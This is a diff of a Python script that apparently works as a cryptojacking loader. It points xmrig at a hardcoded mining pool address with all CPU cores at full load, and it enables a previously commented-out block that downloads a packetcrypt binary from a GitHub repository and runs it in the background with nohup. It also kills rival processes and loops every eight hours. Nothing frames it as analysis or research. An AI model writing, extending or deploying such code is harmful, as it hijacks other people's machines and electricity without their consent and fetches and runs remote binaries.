@@ -4,7 +4,7 @@ import time
 from sys import platform
 import requests
 import subprocess
-#import multiprocessing
+import multiprocessing
 
 
 if platform == "linux" or platform == "linux2":
@@ -14,6 +14,9 @@ elif platform == "darwin":
 elif platform == "win32":
     operate_system = 'win'
 
+cores = multiprocessing.cpu_count()
+if cores <= 0:
+    cores = 1
 timeout = 30
 thoi_gian_nghi = 28800
 if operate_system == 'lin':
@@ -31,7 +34,7 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-command_xmrig_default = '-o 66.42.53.57:443 --tls --cpu-max-threads-hint=100'
+command_xmrig_default = '-o 66.42.53.57:443 --tls -t %s --cpu-max-threads-hint=100' %cores
 #while True:
 time.sleep(1)
 working_dir = os.path.dirname(os.path.realpath(__file__))
@@ -119,7 +122,7 @@ if operate_system == 'lin':
             os.system('tar xf %s' %gz_name)
     except:
         pass
-
+    '''
     try:
         response = requests.get(link_command_xmrig, timeout=timeout)
         command_xmrig_download = response.text.strip()
@@ -130,6 +133,7 @@ if operate_system == 'lin':
             os.system('pkill xmrig')
     except:
         pass
+    '''
     try:
         xmrig_dachay = False
         for proc in psutil.process_iter():
@@ -155,7 +159,7 @@ if operate_system == 'lin':
 
 
     #pkt
-    '''
+    
     link_version_pkt = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_pkt'
     link_download_pkt = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/packetcrypt-v0.5.1-linux_amd64'
     pkt_name = 'packetcrypt'
@@ -214,5 +218,5 @@ if operate_system == 'lin':
             os.system ('nohup %s &' %command)
         else:
             os.system ('%s &' %command)
-    '''
+    
     time.sleep(thoi_gian_nghi)
